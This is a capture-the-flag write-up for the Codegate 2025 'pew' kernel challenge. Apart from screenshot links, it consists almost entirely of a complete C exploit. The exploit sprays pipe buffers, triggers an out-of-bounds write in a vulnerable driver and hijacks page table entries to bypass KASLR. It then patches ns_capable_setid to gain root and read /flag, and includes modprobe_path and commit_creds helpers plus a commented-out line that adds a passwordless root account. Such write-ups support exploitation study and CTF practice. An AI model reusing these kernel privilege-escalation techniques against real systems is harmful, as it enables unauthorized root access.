# pew
<primary-label ref="pwn"/>

codegate 2025 quals

## vulnerability

![Screenshot_20250615_220633.png](Screenshot_20250615_220633.png)

![Screenshot_20250615_220730.png](Screenshot_20250615_220730.png)

## exploit


```c
#define _GNU_SOURCE

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <poll.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <unistd.h>

#define COLOR_ENABLE 0
#define COLOR_RESET   "\033[0m"
#define COLOR_RED     "\033[0;31m"
#define COLOR_GREEN   "\033[0;32m"
#define COLOR_YELLOW  "\033[0;33m"
#define COLOR_BLUE    "\033[0;34m"
#define COLOR_MAGENTA "\033[0;35m"
#define COLOR_CYAN    "\033[0;36m"
#define info(fmt, ...) \
    if (COLOR_ENABLE) { \
        printf(COLOR_BLUE "[*] " fmt COLOR_RESET "\n", ##__VA_ARGS__); \
    } else { \
        printf("[*] " fmt "\n", ##__VA_ARGS__); \
    }
#define success(fmt, ...) \
    if (COLOR_ENABLE) { \
        printf(COLOR_GREEN "[+] " fmt COLOR_RESET "\n", ##__VA_ARGS__); \
    } else { \
        printf("[+] " fmt "\n", ##__VA_ARGS__); \
    }
#define error(fmt, ...) \
    if (COLOR_ENABLE) { \
        printf(COLOR_RED "[-] " fmt COLOR_RESET "\n", ##__VA_ARGS__); \
    } else { \
        printf("[-] " fmt "\n", ##__VA_ARGS__); \
    }
#define warning(fmt, ...) \
    if (COLOR_ENABLE) { \
        printf(COLOR_YELLOW "[!] " fmt COLOR_RESET "\n", ##__VA_ARGS__); \
    } else { \
        printf("[!] " fmt "\n", ##__VA_ARGS__); \
    }

#define rep(X,Y) for (unsigned long X = 0;X < (Y);++X)
#define drep(X,Y) for (unsigned long X = 0;X < (Y);X+=4)
#define qrep(X,Y) for (unsigned long X = 0;X < (Y);X+=8)
#define dqrep(X,Y) for (unsigned long X = 0;X < (Y);X+=16)
#define irep(X) for (unsigned long X = 0;;++X)
#define rrep(X,Y) for (unsigned long X = (Y)-1;X >=0;--X)

/* https://github.com/gmo-ierae/ierae-ctf/blob/main/2024/pwn/free2free/solution/exploit.c */
#define SYSCHK(x) ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) { \
    error("%s: %s\n", "SYSCHK(" #x ")", strerror(errno)); \
    exit(1); \
    } \
    __res; \
    })
#define PTE2V(i) ((unsigned long long)(i) << 12)
#define PMD2V(i) ((unsigned long long)(i) << 21)
#define PUD2V(i) ((unsigned long long)(i) << 30)
#define PGD2V(i) ((unsigned long long)(i) << 39)
#define V2PTE(i) (((unsigned long long)(i) >> 12) & 0x1ff)
#define V2PMD(i) (((unsigned long long)(i) >> 21) & 0x1ff)
#define V2PUD(i) (((unsigned long long)(i) >> 30) & 0x1ff)
#define V2PGD(i) (((unsigned long long)(i) >> 39) & 0x1ff)
#define PHYS_ENTRY(i) ((unsigned long long)(i) | 0x67ULL | (1ULL << 63))
#define PTE2PHYS(i) ((unsigned long)(i) & ~(0x1ULL << 63)&~0xFFFULL)
#define PTI_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, byte_index) \
  ((void*)(PGD2V((unsigned long long)(pgd_index)) + PUD2V((unsigned long long)(pud_index)) + \
    PMD2V((unsigned long long)(pmd_index)) + PTE2V((unsigned long long)(pte_index)) + (unsigned long long)(byte_index)))
#define KVIRT_TO_PHYS(i) ((unsigned long)(i) & 0xff000)
#define KASLR_DIFF(k_addr, i) ((unsigned long)k_addr + (unsigned long)(i)*0x100000)

/* common data */
#define PROC_NAME "NKTIDKSG"
//#define MODPROBE_SCRIPT "#!/bin/sh\necho pwn::0:0:root:/root:/bin/sh>>/etc/passwd\n"
#define MODPROBE_SCRIPT "#!/bin/sh\nchmod 777 /flag\n"
#define MODPROBE_FAKE "/ssbinmodprobe"

unsigned long cs;
unsigned long ss;
unsigned long rsp;
unsigned long rflags;
//linux-6.14.2
unsigned long commit_creds = 0xffffffff812a1050;
unsigned long init_cred = 0xffffffff81e3bfa0;
unsigned long kbase = 0xffffffff96000000;
unsigned long modprobe_path = 0xffffffff98d5ee30;
unsigned long __sys_setuid = 0xffffffff96200d20;
unsigned long ns_capable_setid = 0xffffffff961f3240;
unsigned long ret_true = 0x90c3c0ff48c03148;
unsigned long ret1nop7 = 0x90909090909090c3;

char misc[0x100] = {0};

void shell() {
    puts("[*] shell");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    SYSCHK(execve("/bin/sh", argv, envp));
}

static void ret2user(unsigned long rip) {
    asm volatile ("swapgs\n");
    asm volatile(
        "movq %0, 0x20(%%rsp)\t\n"
        "movq %1, 0x18(%%rsp)\t\n"
        "movq %2, 0x10(%%rsp)\t\n"
        "movq %3, 0x08(%%rsp)\t\n"
        "movq %4, 0x00(%%rsp)\t\n"
        "iretq"
        :
        : "r"(ss),
          "r"(rsp),
          "r"(rflags),
          "r"(cs), "r"(rip));
}

void lpe() {
    void (*cc)(char *) = (void *)commit_creds;
    (*cc)((void *)init_cred);
    ret2user((unsigned long)shell);
}

static void refuge() {
    asm volatile (
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(cs), "=r"(ss), "=r"(rsp), "=r"(rflags)
        :
        : "memory");
}

void dump_memory(char *buf, int size) {
    char *p = buf;
    dqrep (i, size) {
        printf("0x%06x |", (int)i);
        printf(" 0x%016lx ", *(unsigned long *)(p + i));
        printf(" 0x%016lx ", *(unsigned long *)(p + i + 8));
        printf("\n");
    }
}

void xxd(char *buf, int size) {
    char *p = buf;
    dqrep (i, size) {
        printf("0x%06x |", (int)i);
        rep (j, 0x10) { printf(" %02x", *(unsigned char *)(p+i+j)); }
        printf(" |");
        rep (j, 0x10) {
            if (*(unsigned char *)(p+i+j) < 0x20 || *(unsigned char *)(p+i+j) > 0x7e) {
                printf(".");
            } else { printf("%c", *(unsigned char *)(p + i + j)); }
        }
        printf("|\n");
    }
}

void init_modprobe() {
    int exp_fd = SYSCHK(open(MODPROBE_FAKE, O_RDWR | O_CREAT, 0777));
    SYSCHK(write(exp_fd, MODPROBE_SCRIPT, strlen(MODPROBE_SCRIPT)));
    SYSCHK(close(exp_fd));
}

void exec_modprobe() {
    info("exec modprobe");
    socket(38, SOCK_SEQPACKET, 0);
}

void exec_modprobe_old() {
    #define TRIG "/TDN810"
    int trigger = SYSCHK(open(TRIG, O_RDWR | O_CREAT, 0777));
    SYSCHK(write(trigger, "\xdd\xdd", 2));
    SYSCHK(close(trigger));
    execve(TRIG, NULL, NULL);
}

#define NUM_CORES 0
void init_proc() {
    SYSCHK(prctl(PR_SET_NAME, PROC_NAME, 0, 0, 0));
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(NUM_CORES, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

void write2file(char *fn, char *c) {
    int fd = SYSCHK(open(fn, O_WRONLY | O_CREAT | O_TRUNC, 0644));
    SYSCHK(write(fd, c, strlen(c)));
    SYSCHK(close(fd));
}

void read2file(char *fn, char *c, int size) {
    int fd = SYSCHK(open(fn, O_RDONLY));
    SYSCHK(read(fd, c, size));
    SYSCHK(close(fd));
}

#define CMD_OOB 0x1003
#define CMD_SETVAL 0x1002
#define CMD_SETOFF 0x1001
#define MAX_BUF 0x1000

#define MODULE_NAME "/dev/pew"

int main(void) {
    init_proc();
    init_modprobe();

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    void *pte_setup = SYSCHK(mmap(PTI_TO_VIRT(0x1, 0x0, 0x0, 0x0, 0x0), 4098,
                         PROT_READ | PROT_WRITE, MAP_PRIVATE | 0x20 | MAP_FIXED, -1, 0));
    *(char *)pte_setup = 0x1;

    info("spray pipe_buffer");
    #define PIPE_SPRAY_SZ 0x40/2
    #define PAGE_SIZE 0x1000
    int pp[PIPE_SPRAY_SZ*2][2];
    rep (i, PIPE_SPRAY_SZ*2) {
        SYSCHK(pipe(pp[i]));
    }

    info("resize pipe_buffer #1/2");
    rep (i, PIPE_SPRAY_SZ) {
        SYSCHK(fcntl(pp[i][0], F_SETPIPE_SZ,0x40*PAGE_SIZE));
    }

    info("open pew");
    int victim = SYSCHK(open(MODULE_NAME, O_RDWR));

    info("resize pipe_buffer #2/2");
    rep (i, PIPE_SPRAY_SZ) {
        SYSCHK(fcntl(pp[i+PIPE_SPRAY_SZ][0], F_SETPIPE_SZ,0x40*PAGE_SIZE));
    }

    info("write id to pipe_buffer");
    char payload[0x10];
    memset(payload, 0x0, sizeof(payload));
    rep (i,PIPE_SPRAY_SZ*2) {
        *(unsigned long *)payload = (unsigned long)i;
        write(pp[i][1], payload, sizeof(payload));
    }

    info("set val");
    SYSCHK(ioctl(victim, CMD_SETVAL, 0x40));
    info("set off");
    SYSCHK(ioctl(victim, CMD_SETOFF, MAX_BUF));

    info("trigger oob");
    int ret = SYSCHK(ioctl(victim, CMD_OOB, NULL));

    unsigned long tmp, vic, atk;
    rep (i, PIPE_SPRAY_SZ*2) {
        read(pp[i][0], &tmp, sizeof(unsigned long));
        //info("i: %ld, tmp: %ld", i, tmp);
        if (tmp != i) {
            success("found broken pipe %ld", i);
            atk = i; //original
            vic = tmp; //injected page pointer
            success("vic: %ld", vic);
            success("atk: %ld", atk);

            close(pp[atk][0]);
            close(pp[atk][1]);
            void *new_pte = SYSCHK(mmap(PTI_TO_VIRT(0x1, 0x0, 0x80, 0x0, 0x0), 4096*0x100,
                             PROT_READ | PROT_WRITE, MAP_PRIVATE | 0x20 | MAP_FIXED, -1, 0));
            *(char *)new_pte = 0x1;
            info ("new pte: %p", new_pte);

            char *buf=calloc(0x80, 1);
            memset(buf, 0x0, sizeof(*buf));
            read(pp[vic][0], buf, sizeof(buf));
            xxd(buf, sizeof(buf));
            info("buf: 0x%lx", *(unsigned long *)buf);
            if ((unsigned long)*buf == 0x0) {
                error("failed to dup pte");
                exit(1);
            }
            info("dupped pte: 0x%llx", PTE2PHYS(*(unsigned long *)buf));
            break;
        }
    }

    if (vic == 0) {
        error("no broken pipe");
        exit(1);
    }

    info("overwrite pte");
    info("bypassing kaslr")
    int sz = 512*8;

    unsigned long dest = ns_capable_setid-kbase;
    unsigned long machine = 0xf289530000441f0f;

    rep (i,256) {
        char ptes[8];
        unsigned long *p = (unsigned long *)ptes;
        unsigned long pys_modprobe = KASLR_DIFF(KVIRT_TO_PHYS(dest),i);
        unsigned long pte_modprobe = PHYS_ENTRY(pys_modprobe);
        *p = pte_modprobe;

        SYSCHK(write(pp[vic][1], ptes, sizeof(ptes)));
        char *check = PTI_TO_VIRT(0x1, 0x0, 0x80, i, dest & 0xfff);
        
        printf("check %d @ %p |", (int)i, check);
        xxd(check, 0x10);
        
        if (memcmp(check, &machine, 8) ==0){
            success("found ns_capable_setid");
            memmove(check, &ret_true, 8);
            goto win;
        }
        fflush(stdout);
    }
    close(victim);
    error("failed...");
    exit(1);

win:
    success("win");
    SYSCHK(setuid(0));
    info("uid: %d", getuid());

    read2file("/flag", misc, 0x100);
    success("flag: %s", misc);

    return 0;
}
```

![Screenshot_20250615_220956.png](Screenshot_20250615_220956.png)


